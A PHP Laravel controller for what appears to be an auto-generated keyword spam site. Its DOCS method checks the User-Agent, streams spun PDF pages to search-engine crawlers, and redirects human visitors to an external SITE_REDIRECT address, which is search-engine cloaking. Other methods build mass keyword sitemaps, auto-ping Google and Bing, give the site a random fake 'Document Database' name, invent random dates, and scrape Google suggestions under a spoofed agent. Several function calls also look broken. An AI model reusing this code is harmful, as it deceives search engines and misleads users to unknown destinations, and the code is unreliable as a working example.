<?php
namespace App\Http\Controllers;

use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\View;
use Illuminate\Http\Request;
use App\Http\Requests;
use File;
use PDF;
class AgcController extends Controller
{

	public function site_redirect()
	{
		return env("SITE_REDIRECT");
	}
	public function index(Request $request)
	{
		$userUrgent = $_SERVER['HTTP_USER_AGENT'];
		$preg = preg_replace('~[^\pL\d]+~u', ' ', $userUrgent);
		if ((preg_match("/Googlebot/i", $preg)) || (strpos($preg, 'bingbot')  !== false))
		{
			$items = self::getKW();
			$homepagedata = [
				'items' => $items,
				'namasitus' => self::sitename(),
				'urlsitus'=>self::site_url()
			];
			return view('responsive')->with($homepagedata);
		}

		else
		{
			$items = self::getKW();
			$homepagedata = [
				'items' => $items,
				'namasitus'=>self::sitename(),
				'urlsitus'=>self::site_url()
			];
			return view('responsive')->with($homepagedata);

		}


	}




	public function DOCS(Request $req, $kw)
	{
		$userUrgent = $_SERVER['HTTP_USER_AGENT'];
		$preg = preg_replace('~[^\pL\d]+~u', ' ', $userUrgent);
		$files = glob(resource_path('views/Spintax') . '/*.php', GLOB_BRACE);
		$hitung = count($files);
		if ($hitung > 1)
		{

			$data = rand(0, $hitung - 1);
			$data = $files[$data];
		}
		else
		{
			$data = $files[0];
		}
		$pecah = explode('/', $data);
		$count = count($pecah);
		$blade = str_replace('.blade.php', '', $pecah[$count - 1]);

		if((preg_match("/Slurp/", $preg))||(preg_match("/bingbot/", $preg))||(preg_match("/YandexBot/", $preg))||(preg_match("/AppsViewer/", $preg))||(preg_match("/Sogou/", $preg))||(preg_match("/Baiduspider/", $preg))||(preg_match("/musobot/", $preg))||(preg_match("/ZoomBot/", $preg))||(preg_match("/linkdexbot/", $preg))||(preg_match("/Genieo/", $preg))||(preg_match("/Mail.RU_Bot/", $preg))||(preg_match("/AdsBot-Google/", $preg))||(preg_match("/Googlebot/", $preg))) 
		{
			$date = date("Y-m-d H:i:s");
			$pdf = PDF::loadView('Spintax/' . $blade);

			return $pdf->stream($kw.' '.$date.'.pdf');


		}
		else
		{

			return redirect(self::redirurl($kw));
		}

	}

	public function buildsitemap()
	{
		$sitename = 'sitemap_cache';
		$sitename = str_replace(['-', '_', '.', 'http://', 'https'], '', $sitename);
		if (!file_exists( public_path(). '/' . $sitename))
		{
			$key = self::getKW();
			shuffle($key);
			$items['data'] = $key;
			File::makeDirectory(public_path(). '/' . $sitename . '/');
			if (count($items['data']) > 999)
			{
				$jumlah['jumlah'] = ceil(count($items['data']) / 999) - 1;

				$pecahAr = array_chunk($items['data'], 999, true);
				$a = 1;
				for ($i = 0;$i < $jumlah['jumlah'];$i++)
				{
					$nama = $a;
					$datasitemap = [
						'data'		=> $pecahAr[$i],
						'urlsite'	=>env("LIVE_SITE")
					];
					File::put(public_path(). '/' . $sitename . '/sitemap-' . $nama . '.xml', view('sitemap')->with($datasitemap)->render());

					$namarobot[] = 'sitemap-' . $nama . '.xml';
					$a++;
				}
				$sitemapindexdata = [
					'data'	=> $namarobot,
					'urlsite'	=>env("LIVE_SITE")
				];
				File::put( public_path(). '/' . $sitename . '/sitemap_index.xml', view('sitemapIndex')->with($sitemapindexdata)->render());
				$datarobot = [
					'data' => $namarobot,
					'getkw'=>self::getKW(),
					'urlsite'=>env("LIVE_SITE")
				];
				File::put( public_path(). '/' . $sitename . '/robot.txt', view('robot')->with($datarobot)->render());
			}
			else
			{
				File::put(public_path(). '/' . $sitename . '/sitemap_index.xml', view('sitemap', $items)->render());
			}
		}
		elseif (!file_exists( public_path(). '/' . $sitename . '/sitemap_index.xml'))
		{
			$files = glob( public_path(). '/' . $sitename . '/*.xml', GLOB_BRACE);
			File::put( public_path(). '/' . $sitename . '/sitemap_index.xml', view('sitemapIndex')->with('data', $files)->render());

			$file =  public_path(). '/' . $sitename . '/sitemap_index.xml';
			return response()->file($file, ['Content-Type' => 'text/xml']);
		}
		else
		{
			$file =  public_path(). '/' . $sitename . '/sitemap_index.xml';
			return response()->file($file, ['Content-Type' => 'text/xml']);
		}

	}


	public function sitemap()
	{
		$sitename = 'sitemap_cache';
		$sitename = str_replace(['-', '_', '.', 'http://', 'https'], '', $sitename);
		if (!file_exists( public_path(). '/' . $sitename))
		{
			$key = self::getKW();
			shuffle($key);
			$items['data'] = $key;
			File::makeDirectory(public_path(). '/' . $sitename . '/');
			if (count($items['data']) > 999)
			{
				$jumlah['jumlah'] = ceil(count($items['data']) / 999) - 1;

				$pecahAr = array_chunk($items['data'], 999, true);
				$a = 1;
				for ($i = 0;$i < $jumlah['jumlah'];$i++)
				{
					$nama = $a;
					$datasitemap = [
						'data'		=> $pecahAr[$i],
						'urlsite'	=>self::site_url()
					];
					File::put(public_path(). '/' . $sitename . '/sitemap-' . $nama . '.xml', view('sitemap')->with($datasitemap)->render());

					$namarobot[] = 'sitemap-' . $nama . '.xml';
					$a++;
				}
				$sitemapindexdata = [
					'data'	=> $namarobot,
					'urlsite'	=>self::site_url()
				];
				File::put( public_path(). '/' . $sitename . '/sitemap_index.xml', view('sitemapIndex')->with($sitemapindexdata)->render());
				$datarobot = [
					'data' => $namarobot,
					'getkw'=>self::getKW(),
					'urlsite'=>self::site_url()
				];
				File::put( public_path(). '/' . $sitename . '/robot.txt', view('robot')->with($datarobot)->render());
			}
			else
			{
				File::put(public_path(). '/' . $sitename . '/sitemap_index.xml', view('sitemap', $items)->render());
			}
		}
		elseif (!file_exists( public_path(). '/' . $sitename . '/sitemap_index.xml'))
		{
			$files = glob( public_path(). '/' . $sitename . '/*.xml', GLOB_BRACE);
			File::put( public_path(). '/' . $sitename . '/sitemap_index.xml', view('sitemapIndex')->with('data', $files)->render());

			$file =  public_path(). '/' . $sitename . '/sitemap_index.xml';
			return response()->file($file, ['Content-Type' => 'text/xml']);
		}
		else
		{
			$file =  public_path(). '/' . $sitename . '/sitemap_index.xml';
			return response()->file($file, ['Content-Type' => 'text/xml']);
		}

	}

	public function sitemapShow($sitemap)
	{
		$sitename = 'sitemap_cache';
		$sitename = str_replace(['-', '_', '.'], '', $sitename);
		if (file_exists( public_path(). '/' . $sitename . '/sitemap-' . $sitemap . '.xml'))
		{

			$file = public_path(). '/' . $sitename . '/sitemap-' . $sitemap . '.xml';
			return response()->file($file, ['Content-Type' => 'text/xml']);

		}
		else
		{
			return redirect('/sitemap_index.xml');
		}
	}

	public function robot()
	{
		$sitename = 'sitemap_cache';
		$sitename = str_replace(['-', '_', '.'], '', $sitename);
		if (!file_exists( public_path(). '/' . $sitename . '/robots.txt'))
		{
			$files = glob( public_path(). '/' . $sitename . '/*.xml', GLOB_BRACE);
			$robotdata = [
				'data' => $files,
				'getkw'=>self::getKW(),
				'urlsite'=>self::site_url()
			];
			File::put(public_path(). '/' . $sitename . '/robot.txt', view('robot')->with($robotdata)->render());
			$file =  public_path(). '/' . $sitename . '/robot.txt';
			return response()->file($file, ['Content-Type', 'text/plain']);
		}
		else
		{
			$file = public_path(). '/' . $sitename . '/robot.txt';
			return response()->file($file, ['Content-Type', 'text/plain']);
		}
	}
	public function feed()
	{
		$items = self::getKW();
		return Response::view('rss', ['items' => $items])->header('Content-Type', 'text/xml');
	}


	// pindah kesini semua

	public function site_url()
	{
		return  request()->getSchemeAndHttpHost();
	}


	public function kwPdf($kw)
	{
		return url('/').'/'.sitemap()['keyword-url'].'/'.str_replace(' ','_',strtolower(clear($kw))).".pdf";
	}

	public function urlPdf($kw)
	{
		$kw = str_replace(' ','_',strtolower(clear($kw))).'.pdf';
		return str_replace(' ','',$kw);
	}

	public function sitename()
	{
		$doc = ['DOC','PDF','EPUB','PPT','FILE','FILES','DOCUMENT','EBOOK','EBOOKS'];
		$r =array_rand($doc,1);
		return "[".$doc[$r]."] Document Database Online Site";
	}

	public function redirurl($kw)
	{
		return self::site_redirect()."/?v=".self::clear($kw).".pdf";;
	}

	public function spin($text)
	{
		return preg_replace_callback(
			'/{(.*?)}/',
			function($matches) { 
				return explode('|', $matches[1])
				[mt_rand(0, count(explode('|', $matches[1])) - 1)]; 
			}, 
			$text);
	}

	

	public function randomPdf()
	{
		$files = glob(public_path('dataSpintax').'/*.txt', GLOB_BRACE);
		$hitung = count($files);
		if($hitung != 1)
		{

			$data= rand(0,$hitung);
			$data = $files[$data];
		}
		else
		{
			$data = $files[0];
		}
		return $data;
	}

	public function getKW()
	{
		$files = glob(public_path('keywords').'/*.txt', GLOB_BRACE);
		$keywords = '';
		foreach($files as $file) {
			$keywords.=  file_get_contents($file);

		}
		return explode(PHP_EOL,$keywords);
	}

	public function clear($teks)
	{
		$filter = array('~', '`', '!', '@', '#', '$', '%', '^', '&','*','*','(',')','-','_','=','+','.','/','?','”','[','{','}',']','\\','”',';','<','>','|',':');
		$result= str_replace(' ','_',trim(str_replace($filter,' ',strtolower($teks))));
		$result = str_replace('-pdf','',$result);
		return $result;
	}

	public function pinger( $url = '' ){
		if( empty($url) ) {
			$url = site_url( $url );
		}
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_exec($ch);
		curl_close($ch);
		return true;
	}

	public function autoPing()
	{	
		$minu = array(0, 10, 28, 30, 40, 50, 59);
		if( in_array(date('i'), $minu) ) 
		{
			$s = site_url()."/sitemap_index.xml";
			$url = "http://www.google.com/webmasters/sitemaps/ping?sitemap=".$s;
			pinger($url);
			$url = "http://www.bing.com/webmaster/ping.aspx?siteMap=".$s;
			pinger($url);
		}
	}

	public function get_delimiter($ref) {
		$search_engines = array('google.com' => 'q',
			'go.google.com' => 'q',
			'images.google.com' => 'q',
			'video.google.com' => 'q',
			'news.google.com' => 'q',
			'blogsearch.google.com' => 'q',
			'maps.google.com' => 'q',
			'local.google.com' => 'q',
			'search.yahoo.com' => 'p',
			'search.msn.com' => 'q',
			'bing.com' => 'q',
			'msxml.excite.com' => 'qkw',
			'search.lycos.com' => 'query',
			'alltheweb.com' => 'q',
			'search.aol.com' => 'query',
			'search.iwon.com' => 'searchfor',
			'ask.com' => 'q',
			'ask.co.uk' => 'ask',
			'search.cometsystems.com' => 'qry',
			'hotbot.com' => 'query',
			'overture.com' => 'Keywords',
			'metacrawler.com' => 'qkw',
			'search.netscape.com' => 'query',
			'looksmart.com' => 'key',
			'dpxml.webcrawler.com' => 'qkw',
			'search.earthlink.net' => 'q',
			'search.viewpoint.com' => 'k',
			'yandex.kz' => 'text',
			'yandex.ru' => 'text',
			'baidu.com' => 'wd',			
			'mamma.com' => 'query');
		$delim = false;
		if (isset($search_engines[$ref])) {
			$delim = $search_engines[$ref];
		} else {
			if (strpos('ref:'.$ref,'google'))
				$delim = "q";
			elseif (strpos('ref:'.$ref,'search.atomz.'))
				$delim = "sp-q";
			elseif (strpos('ref:'.$ref,'search.msn.'))
				$delim = "q";
			elseif (strpos('ref:'.$ref,'search.yahoo.'))
				$delim = "p";
			elseif (strpos('ref:'.$ref,'yandex'))
				$delim = "text";
			elseif (strpos('ref:'.$ref,'baidu'))
				$delim = "wd";	
			elseif (preg_match('/home\.bellsouth\.net\/s\/s\.dll/i', $ref))
				$delim = "bellsouth";
		}
		return $delim;
	}

	public function get_terms($d) {
		$terms       = null;
		$query_array = array();
		$query_terms = null;
		$query = explode($d.'=', $_SERVER['HTTP_REFERER']);
		$query = explode('&', $query[1]);
		$query = urldecode($query[0]);
		$query = str_replace("'", '', $query);
		$query = str_replace('"', '', $query);
		$query_array = preg_split('/[\s,\+\.]+/',$query);
		$query_terms = implode(' ', $query_array);
		$terms = htmlspecialchars(urldecode(trim($query_terms)));
		return $terms;
	}

	public function get_referer() {
		if (!isset($_SERVER['HTTP_REFERER']) || ($_SERVER['HTTP_REFERER'] == '')) return false;
		$referer_info = parse_url($_SERVER['HTTP_REFERER']);
		$referer = $referer_info['host'];
		if(substr($referer, 0, 4) == 'www.')
			$referer = substr($referer, 4);
		return $referer;
	}

	public function GetKeyword() {
		$referer = get_referer();
		if (!$referer) return false;
		$delimiter = get_delimiter($referer);
		if( $delimiter ){
			$term =get_terms($delimiter);	
			return $term;
		}

	}

	public function randomDate()
	{
		$min = strtotime('2013-01-01');
		$max =  strtotime(date('Y-m-d'));
		$val = rand($min, $max);
		return date('D, d M Y H:i:s', $val);
	}

	public function randomDateSitemap()
	{
		$min = strtotime('2013-01-01');
		$max =  strtotime(date('Y-m-d'));
		$val = rand($min, $max);
		return date('c', $val);
	}

	public function Query($locale,$query){
		$query = urlencode($query);
		$agent = "AAPP Application/1.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.4)";
		$host = "http://clients1.google.com/complete/search?hl=en&output=toolbar&q=".$query;
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $host);
		curl_setopt($ch, CURLOPT_USERAGENT, $agent);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		$xml = curl_exec($ch);
		curl_close($ch);

		$pecah = explode('<suggestion data="',$xml);
		if(count($pecah)!=0){
			for($i=1;$i<count($pecah);$i++)
			{
				$pecahLagi = explode('"/>',$pecah[$i]);
				echo "<li><a href='http://".$_SERVER['SERVER_NAME']."/".self::sitemap()['keyword-url']."/".urlPdf($pecahLagi[0])."'>".ucwords($pecahLagi[0])."</a></li>";
			}
		}
	}

}

